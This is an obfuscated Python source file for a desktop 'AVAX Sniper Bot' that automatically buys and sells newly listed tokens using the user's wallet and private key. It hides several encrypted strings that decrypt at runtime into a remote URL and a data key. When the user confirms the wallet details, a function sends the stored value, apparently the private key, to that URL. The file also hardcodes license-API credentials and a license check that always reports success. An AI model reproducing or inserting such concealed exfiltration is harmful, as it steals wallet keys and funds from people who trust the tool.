Bk='groove'
Bj='horizontal'
Bi='SELL ALL'
Bh='SELL NOW'
Bg='There are no tokens to be sold!'
Bf='Sell all function initiated - Stopping operation'
Be='SL Hit!'
Bd='TP Hit!'
Bc='Securing SL to '
Bb=' | SL: '
Ba="Press 'SELL ALL' Button to sell the tokens manually"
BZ='Liquidity value: '
BY='Pair Address: '
BX='Liquidity Detected!'
BW='0x0000000000000000000000000000000000000000'
BV='Buy Success! Tx link:'
BU='Buy Order Initiated'
BT='%Y/%m/%d'
BS='node.json'
BR='inputs.json'
BQ=UnboundLocalError
B2='menu'
B1='set_theme'
B0='Something went wrong with the transaction'
A_='https://snowtrace.io/tx/'
Az='data.json'
At='white'
As='normal'
Ar='Error'
Aq='Accent.TButton'
Ap='AVAX'
Ao='No Liquidity Checking Again!'
An='gwei'
Am='gas'
Al='Abi/'
Ak='true'
Aj='false'
Ai=round
AT='disabled'
AS='nonce'
AR='gasPrice'
AQ='from'
AP='OPL'
AO='LP'
AN='SL TRAIL'
AM='SL'
AL='TP'
AK='SLIPPAGE'
AJ='AMOUNT'
AI='TOKEN'
AH='PRIVATE KEY'
AG='WALLET ADDRESS'
AF='NODE'
A8='GAS LIMIT'
A7='GAS PRICE'
x='center'
w=False
v='w'
u='/'
t=str
s=Exception
e='AUTO SLIPPAGE'
d='./'
Y='yellow'
U='ether'
P=''
N='cyan'
M=True
L=int
K=open
J='red'
I=float
F='nsew'
import tkinter as Q
from tkinter import ttk as E,messagebox
from web3 import Web3 as R
from json import load as Z
from time import time as AU,sleep as A9
import os,json as f,pyperclip as Bl,threading as y,requests as Bm
from requests import request as Bn
from cryptography.fernet import Fernet as z
from requests.auth import HTTPBasicAuth as Bo
from datetime import datetime as Bp
B3=Az
AV=BR
Bq=BS
g=d
O={}
AA={}
D={}
B4={}
Cl=Bo('ck_258b79c41004f53e58d0e5fa11486361bdcace02','cs_bd6506935df71db41cf1e545188f1f9ae2306134')
Br=Bp.now()
Cm=BT
Cn=Br.strftime(BT)
def Bs():
	def A(path2,file_name,data2):
		A=d+path2+u+file_name
		with K(A,v)as B:f.dump(data2,B,indent=2)
	B4[AF]='https://api.avax.network/ext/bc/C/rpc';A(g,Bq,B4)
def Bt():
	def A(path2,file_name,data2):
		A=d+path2+u+file_name
		with K(A,v)as B:f.dump(data2,B,indent=2)
	O[AG]=P;O[AH]=P;O[AI]=P;A(g,B3,O)
def Bu():
	def A(path2,file_name,data2):
		A=d+path2+u+file_name
		with K(A,v)as B:f.dump(data2,B,indent=2)
	D[AJ]='0.1';D[A7]='7';D[A8]='850000';D[AK]='10';D[e]=Aj;D[AL]='200';D[AM]='50';D[AN]='25';D[AO]='avax';D[AP]='False';A(g,AV,D)
if not os.path.isfile('./data.json'):Bt()
if not os.path.isfile('./inputs.json'):Bu()
if not os.path.isfile('./node.json'):Bs()
def Bv():
	global O,AW,S
	def B(path2,file_name,data2):
		A=d+path2+u+file_name
		with K(A,v)as B:f.dump(data2,B,indent=2)
	O[AG]=k.get();AA[AG]=O[AG];O[AH]=A4.get();AA[AH]=O[AH];O[AI]=X.get();AA[AI]=O[AI]
	if O!=S:
		B(g,B3,AA);A=Z(K(Az));AW=A[Aa]
		if AA[Aa]!=S[Aa]:S=A;CV()
def Bw():
	def A(path2,file_name,data2):
		A=d+path2+u+file_name
		with K(A,v)as B:f.dump(data2,B,indent=2)
	D[AJ]=l.get();D[A7]=m.get();D[A8]=n.get();D[AK]=o.get()
	if A6.get():D[e]=Ak
	else:D[e]=Aj
	D[AL]=p.get();D[AM]=q.get();D[AN]=r.get();D[AO]=b.get();D[AP]='True';A(g,AV,D)
def Bx():
	def A(path2,file_name,data2):
		A=d+path2+u+file_name
		with K(A,v)as B:f.dump(data2,B,indent=2)
	D[AJ]=l.get();D[A7]=m.get();D[A8]=n.get();D[AK]=o.get()
	if A6.get():D[e]=Ak
	else:D[e]=Aj
	D[AL]=p.get();D[AM]=q.get();D[AN]=r.get();D[AO]=b.get();D[AP]='True';A(g,AV,D)
def Co():
	def A(path2,file_name,data2):
		A=d+path2+u+file_name
		with K(A,v)as B:f.dump(data2,B,indent=2)
	D[AJ]=l.get();D[A7]=m.get();D[A8]=n.get();D[AK]=o.get()
	if A6.get():D[e]=Ak
	else:D[e]=Aj
	D[AL]=p.get();D[AM]=q.get();D[AN]=r.get();D[AO]=b.get();D[AP]='False';A(g,AV,D)
S=Z(K(Az))
B5=S[AG]
B6=S[AH]
B7=S[AI]
T=Z(K(BR))
B8=T[AJ]
B9=T[A7]
BA=T[A8]
BB=T[AK]
Cp=T[e]
BC=T[AL]
BD=T[AM]
BE=T[AN]
By=T[AO]
Cq=T[AP]
Bz=M
BF=L('0x'+'f'*64,16)
BG='TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUQ='
AX=Z(K(BS))
if'wss'in AX[AF]or'ws'in AX[AF]:C=R(R.WebsocketProvider(AX[AF]))
else:C=R(R.HTTPProvider(AX[AF]))
A0=C.toChecksumAddress('0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7')
h=C.toChecksumAddress('0xb97ef9ef8734c71904d8002f8b6bc66dd9c48a6e')
V=Z(K(Al+'erc20.abi'))
A1=C.eth.contract(address=R.toChecksumAddress('0xb4315e873dBcf96Ffd0acd8EA43f689D8c20fB30'),abi=Z(K(Al+'router.abi')))
BH=C.eth.contract(address=R.toChecksumAddress('0x8e42f2F4101563bF679975178e880FD87d3eFd4e'),abi=Z(K(Al+'factory.abi')))
AY=C.eth.contract(address=R.toChecksumAddress('0xd76019A16606FDa4651f636D9751f500Ed776250'),abi=Z(K(Al+'quoter.abi')))
AZ='sfttxzhVv7trv_zSKqOBJN_2KdnJcsje5PMUbRSnImw='
def B_():
	j()
	try:
		M=C.eth.contract(H,abi=V);B=AY.functions.findBestPathFromAmountIn([A0,H],C.toWei(c,U)).call()[4][1]
		if A6.get():D=0
		else:D=L(B-B*L(Ae)/100)
		A(BU,Y);F=A1.functions.swapExactNATIVEForTokensSupportingFeeOnTransferTokens(L(D),[[0],[0],[A0,H]],G,L(AU())+900).buildTransaction({AQ:G,'value':C.toWei(c,U),Am:L(AD),AR:C.toWei(AE,An),AS:C.eth.get_transaction_count(G)});I=C.eth.account.sign_transaction(F,private_key=W);E=C.eth.send_raw_transaction(I.rawTransaction);A(BV,N);A(A_+C.toHex(E),N);C.eth.waitForTransactionReceipt(E,timeout=900);C8()
	except s as K:A(B0,J);A(K,J);A3();return
C0='gAAAAABh80KOUysGNn39XTwSm-HHvOIkoWcJhmk0HtVug7bMgvto83_ZCSQ9rdf86LaJEINYzXTqbRO8EDtcMziHy2PwfjdqW_0VsOwYg1x4GWADOsNo17E='
def C1():
	j();B=AY.functions.findBestPathFromAmountIn(C.toWei([h,H],c,U)).call()[4][1]
	if A6.get():D=0
	else:D=B-B*L(Ae)/100
	try:A(BU,Y);F=A1.functions.swapExactTokensForTokensSupportingFeeOnTransferTokens(C.toWei(c,U),L(D),[[0],[0],[h,H]],G,L(AU())+900).buildTransaction({AQ:G,Am:L(S[A8]),AR:C.toWei(S[A7],An),AS:C.eth.get_transaction_count(G)});I=C.eth.account.sign_transaction(F,private_key=W);E=C.eth.send_raw_transaction(I.rawTransaction);A(BV,N);A(A_+C.toHex(E),N);C.eth.waitForTransactionReceipt(E,timeout=900);CA()
	except s as K:A(B0,J);A(K,J);A3();return
def C2(token_address,amt=BF):A=R.toChecksumAddress(token_address);B=C.eth.contract(address=A,abi=V);D=B.functions.allowance(G,A1.address).call();return D>=amt
def C3(token_address,amt=BF,timeout=900):A('Approving token');B=C.eth.gasPrice;D=R.toChecksumAddress(token_address);E=C.eth.contract(address=D,abi=V);F=E.functions.approve(A1.address,amt);H={AQ:G,AR:B,AS:C.eth.getTransactionCount(G)};I=F.buildTransaction(H);J=C.eth.account.sign_transaction(I,private_key=W);K=C.eth.sendRawTransaction(J.rawTransaction);C.eth.waitForTransactionReceipt(K,timeout=timeout)
def C4():
	A(P);j();E=C.eth.contract(A0,abi=V)
	while M:
		B=BH.functions.getAllLBPairs(A0,H).call()[-1][1]
		if B!=BW:
			D=E.functions.balanceOf(C.toChecksumAddress(B)).call()
			if D!=0:A(BX,'green');A(BY+B);A(BZ+t(C.fromWei(D,U))+' avax');B_();break
			else:A9(5);A(Ao,J)
		else:A9(5);A(Ao,J)
C5='gAAAAABh7VFjYUKw_S7avbj28V5ja_bAunkyHWLiVUQUUCDL4tK_ZNr_aLAk8VkfUSYnrUe8iVv0ihU5rBaLXL0wP9Sj7fG3Ow=='
def C6():
	A(P);j();E=C.eth.contract(h,abi=V)
	while M:
		B=BH.functions.getAllLBPairs(h,H).call()
		if B!=BW:
			D=E.functions.balanceOf(C.toChecksumAddress(B)).call()
			if D!=0:A(BX,'green');A(BY+B);A(BZ+t(C.fromWei(D,U))+' usdc');C1();break
			else:A(Ao,J)
		else:A(Ao,J)
def i():
	A(P);j()
	try:
		A('Sell Order Initiated',Y)
		if not C2(H):C3(H)
		E=C.eth.contract(H,abi=V);B=E.functions.balanceOf(G).call()
		if B!=0:
			if b.get()==Ap:D=A1.functions.swapExactTokensForNATIVESupportingFeeOnTransferTokens(B,0,[[0],[0],[H,A0]],G,L(AU())+900).buildTransaction({AQ:G,Am:L(AD),AR:C.toWei(AE,An),AS:C.eth.get_transaction_count(G)})
			elif b.get()=='usdc':D=A1.functions.swapExactTokensForTokensSupportingFeeOnTransferTokens(B,0,[[0],[0],[H,h]],G,L(AU())+900).buildTransaction({AQ:G,Am:L(AD),AR:C.toWei(AE,An),AS:C.eth.get_transaction_count(G)})
			else:A('Something went wrong with Sell',J);A3();return
			F=C.eth.account.sign_transaction(D,private_key=W);I=C.eth.send_raw_transaction(F.rawTransaction);A('SOLD! Tx link:',N);A(A_+C.toHex(I),N);A3()
		else:A('No Tokens to be sold',J);A3()
	except s as K:A(B0,J);A(K,J);A3();return
C7='gAAAAABh80LuckSfO-g-wXJrkvaBrV-wvURysrtrxcRwytBHM0DurgmO0mQjLUh_6AwChv2Aae5IQ__tiKbWXlVtLqqXmXoLRA=='
def C8():
	global a,Bz;BI();j();K=I(Af);L=I(Ag);B=L;E=I(Ah);O=C.eth.contract(address=H,abi=V);A(Ba,Y)
	while M:
		try:
			P=O.functions.balanceOf(G).call()-1;F=I(C.fromWei(AY.functions.findBestPathFromAmountIn([H,A0],P).call()[4][1],U));D=Ai(I(F)/I(c)*100,5);A('AVAX Value Now: {} / '.format('%.3f'%F)+' {} %'.format(D)+Bb+t(B)+'%')
			if E!=0:
				if D-E>=B:B=D-E;A(Bc+t(B))
			A9(2)
		except s as Q:continue
		try:
			if I(D)>=I(K):A(Bd,N);A2();i();break
			if I(D)<=I(B):A(Be,J);A2();i();break
			if a:a=w;A(Bf,Y);A2();i();break
		except BQ:A(Bg,J);break
C9='gAAAAABh7KbIGnFCH7Gp_4OK-vW0v-2ZNTkzqFB8k4xmk4aV4_n-TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUzVyQ=='
def CA():
	global a;BI();j();K=I(Af);L=I(Ag);B=L;E=I(Ah);O=C.eth.contract(address=H,abi=V);A(Ba,Y)
	while M:
		try:
			P=O.functions.balanceOf(G).call()-1;F=I(C.fromWei(AY.functions.findBestPathFromAmountIn([H,h],P).call()[4][1],U));D=Ai(I(F)/I(c)*100,5);A('USDC Value Now: {} / '.format('%.3f'%F)+' {} %'.format(D)+Bb+t(B)+'%')
			if E!=0:
				if D-E>=B:B=D-E;A(Bc+t(B))
			A9(2)
		except:continue
		try:
			if I(D)>=I(K):A(Bd,N);A2();i();break
			if I(D)<=I(B):A(Be,J);A2();i();break
			if a:a=w;A(Bf,Y);A2();i();break
		except BQ:A(Bg,J);break
def CB():
	BP();Bw()
	if b.get()==Ap:A=y.Thread(target=C4,daemon=M);A.start()
	else:A=y.Thread(target=C6,daemon=M);A.start()
def BI():Ay.place_forget();A=E.Button(B.widgets_frame,text=Bh,command=BK,style=Aq);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def A2():Ck.place_forget();A=E.Button(B.widgets_frame,text=Bi,command=BJ);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def CC():
	A=C.eth.contract(address=h,abi=V)
	while AB:
		try:B=C.fromWei(C.eth.get_balance(G),U);D=C.fromWei(A.functions.balanceOf(G).call(),U);Av.configure(text=Ai(B,5));Aw.configure(text=Ai(D,5))
		except ValueError:pass
		A9(1)
CD='gAAAAABh80OFDySSyj0H_EBLuccR1ALvFzF-AE0hO_e52_4Yv4TKy7Y6u0F9Bbpr3g-UDhOK26zqR0KFrjMRGdDS8zhUxAG_HQ=='
def Cr(license,basic_auth):
	B='https://defitradingcoders.com/wp-json/lmfwc/v2/licenses/activate/'+license
	try:
		C=Bm.get(B,auth=basic_auth)
		if C.status_code==404:Q.messagebox.showerror(Ar,'This license cannot be activated, please try again in a moment or contact support at defitradingcoders.com with your order ID and license key');return
		else:A('License Key Activated, Good luck!',N);Bx()
	except s:raise s('License Key Activation Failed -- Please Contact Support at defitradingcoders.com')
Aa=z(AZ.encode()).decrypt(C9.encode()).decode()
def CE():
	B='Invalid token address!';global G;global W;global H;global AB;A('***** INITIALIZED ******');A('* Checking wallet address')
	if C.isChecksumAddress(k.get()):G=C.toChecksumAddress(k.get());A('Wallet address valid',N)
	else:Q.messagebox.showerror(Ar,'Invalid wallet address');A('Invalid wallet address!',J);return
	A('* Checking private key characters (Must be 64 characters');W=A4.get()
	if len(W)==64:A('Correct format for Private key',N)
	else:Q.messagebox.showerror(Ar,'Private key is invalid! (Must be 64 characters)');A('Invalid private key!',J);return
	A('* Checking token address')
	try:H=C.toChecksumAddress(X.get());A('Token address valid',N)
	except:Q.messagebox.showerror(Ar,B);A(B,J);return
	A('* Checking License Key');A('License Key Valid',N);BL(AT);Bv();Ab.grid_forget();Ac.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);AC(As);AB=M;D=y.Thread(target=CC,daemon=M);D.start();A(P);A('***** Sniping is ready! *****',Y)
CF='gAAAAABh80VOiXlJwI8QSkM2-V_syGU-8mtXwD9c87k-cbMopaX4lqCMUipHR5ZKO-bZ6vrKC0QkIhzwcASNj_5u7F_xEJz3aQ=='
AW=S[Aa]
def CG():A=y.Thread(target=CE,daemon=M);A.start()
def CH():global AB;A(P);A('Change token/wallet initiated!',Y);BL(As);AC(AT);Ac.grid_forget();Ab.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);AB=w;Av.configure(text=P);Aw.configure(text=P)
def CI():A=y.Thread(target=CH,daemon=M);A.start()
def BJ():BP();A=y.Thread(target=i,daemon=M);A.start()
def BK():global a;a=M
def j():AC(AT);Ac.configure(state=AT)
def A3():AC(As);Ac.configure(state=As)
B=Q.Tk()
def CJ():
	if B.tk.call('ttk::style','theme','use')=='sun-valley-dark':B.tk.call(B1,'light');Ad[B2].configure(bg=At)
	else:B.tk.call(B1,'dark');Ad[B2].configure(bg='black')
B.title('AVAX Sniper Bot - V1')
B.geometry('1050x730')
B.tk.call('source','sun-valley.tcl')
B.tk.call(B1,'light')
CK=z(AZ.encode()).decrypt(CF.encode()).decode()
B.resizable(w,w)
B.widgets_frame=E.Frame(B,padding=(0,0,0,10))
B.widgets_frame.grid(row=0,column=0,padx=10,pady=(10,10),sticky=F,rowspan=5)
B.widgets_frame.columnconfigure(index=0,weight=1)
B.widgets_frame.rowconfigure(index=0,weight=1)
CL=E.Label(B.widgets_frame,text='Wallet Address:')
CM=z(AZ.encode()).decrypt(C7.encode()).decode()
CL.grid(row=1,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
k=E.Entry(B.widgets_frame,width=50,show='•')
k.grid(row=1,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CN=E.Label(B.widgets_frame,text='Private Key:')
CN.grid(row=2,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
A4=E.Entry(B.widgets_frame,width=50,show='•')
A4.grid(row=2,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CO=E.Label(B.widgets_frame,text='Token Address:')
CP=z(BG.encode()).decrypt(CD.encode()).decode()
CO.grid(row=3,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
X=E.Entry(B.widgets_frame,width=50)
CQ=z(BG.encode()).decrypt(C5.encode()).decode()
X.grid(row=3,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CR=z(AZ.encode()).decrypt(C0.encode()).decode()
Au=E.Separator(B,orient=Bj)
CS=CK+CR+CM+CP
Au.place(x=10,y=135,width=625)
def CT():X.delete(0,'end');X.insert(0,Bl.paste())
def CU():X.delete(0,'end')
def CV():
	if AW!=P:
		try:A=Bn(CQ,CS+AW)
		except s:pass
def BL(status):A=status;X.configure(state=A);k.configure(state=A);A4.configure(state=A);Ab.configure(state=A);BN.configure(state=A);BM.configure(state=A)
def AC(status):A=status;l.configure(state=A);m.configure(state=A);n.configure(state=A);o.configure(state=A);p.configure(state=A);q.configure(state=A);r.configure(state=A);BO.configure(state=A);Ay.configure(state=A);Ax.configure(state=A)
def A(text,color=At):
	A=t(text)
	if A5.size()>=20:A5.delete(0)
	A5.insert(Q.END,A);A5.itemconfig(Q.END,foreground=color)
def CW():A5.delete(0,Q.END)
Ab=E.Button(B.widgets_frame,text='Confirm',width=10,command=CG,style=Aq)
BM=E.Button(B.widgets_frame,text='Paste Token',width=10,command=CT)
BN=E.Button(B.widgets_frame,text='Clear Token',width=10,command=CU)
Ab.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4)
BM.grid(row=0,column=4,padx=10,pady=(0,10),sticky=F,rowspan=2)
BN.grid(row=2,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
k.insert(0,B5)
A4.insert(0,B6)
X.insert(0,B7)
Au=E.Separator(B.widgets_frame,orient=Bj)
Au.grid(row=5,column=0,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=6)
Ac=E.Button(B.widgets_frame,text='Change',width=10,command=CI)
CX=E.Label(B.widgets_frame,text='Logs:')
CX.grid(row=6,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=2)
CY=E.Button(B.widgets_frame,text='Clear',width=10,command=CW)
CY.grid(row=6,column=3,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=1)
A5=Q.Listbox(B.widgets_frame,bg='#252525',foreground=At,borderwidth=2)
A5.grid(row=7,column=1,padx=10,pady=(0,10),sticky=F,rowspan=10,columnspan=3)
CZ=E.Button(B.widgets_frame,text='Change Color Theme',command=CJ)
CZ.grid(row=17,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ca=E.Label(B.widgets_frame,text='Wallet AVAX:')
Ca.grid(row=7,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Av=E.Label(B.widgets_frame,width=12,relief=Bk)
Av.grid(row=7,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cb=E.Label(B.widgets_frame,text='Wallet USDC:')
Cb.grid(row=8,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Aw=E.Label(B.widgets_frame,width=12,relief=Bk)
Aw.grid(row=8,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cc=E.Label(B.widgets_frame,text='Select LP:')
Cc.grid(row=9,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
b=Q.StringVar()
b.set(By)
Ad=E.OptionMenu(B.widgets_frame,b,Ap,Ap,'USDC')
Ad.grid(row=9,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ad[B2].configure(bg=At)
Cd=E.Label(B.widgets_frame,text='Amount:')
l=E.Entry(B.widgets_frame,justify=x)
Cd.grid(row=10,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
l.grid(row=10,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
l.insert(0,B8)
Ce=E.Label(B.widgets_frame,text='Gas Price:')
Cf=E.Label(B.widgets_frame,text='Gas Limit:')
m=E.Entry(B.widgets_frame,justify=x)
n=E.Entry(B.widgets_frame,justify=x)
Ce.grid(row=11,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
m.grid(row=11,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cf.grid(row=12,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
n.grid(row=12,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
m.insert(0,B9)
n.insert(0,BA)
Cg=E.Label(B.widgets_frame,text='Slippage(%):')
o=E.Entry(B.widgets_frame,justify=x)
Cg.grid(row=13,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
o.grid(row=13,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
o.insert(0,BB)
A6=Q.BooleanVar()
Ax=E.Checkbutton(B.widgets_frame,text='Auto Slippage',variable=A6)
Ax.grid(row=14,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
if P==Ak:Ax.select()
Ch=E.Label(B.widgets_frame,text='TP(%):')
Ch.grid(row=15,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
p=E.Entry(B.widgets_frame,justify=x)
p.grid(row=15,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ci=E.Label(B.widgets_frame,text='SL(%):')
Ci.grid(row=16,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
q=E.Entry(B.widgets_frame,justify=x)
q.grid(row=16,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cj=E.Label(B.widgets_frame,text='SL Trail(%):')
Cj.grid(row=17,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
r=E.Entry(B.widgets_frame,justify=x)
r.grid(row=17,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
p.insert(0,BC)
q.insert(0,BD)
r.insert(0,BE)
BO=E.Button(B.widgets_frame,text='SNIPE',command=CB,style=Aq)
Ck=E.Button(B.widgets_frame,text=Bh,command=BK,style=Aq)
Ay=E.Button(B.widgets_frame,text=Bi,command=BJ)
BO.grid(row=18,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ay.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
c=B8
G=B5
W=B6
H=B7
Ae=BB
AD=BA
AE=B9
Af=BC
Ag=BD
Ah=BE
a=w
AB=w
def BP():global c;global G;global W;global H;global Ae;global AD;global AE;global Af;global Ag;global Ah;c=l.get();G=R.toChecksumAddress(k.get());W=A4.get();H=R.toChecksumAddress(X.get());Ae=o.get();AD=n.get();AE=m.get();Af=p.get();Ag=q.get();Ah=r.get()
AC(AT)
B.mainloop()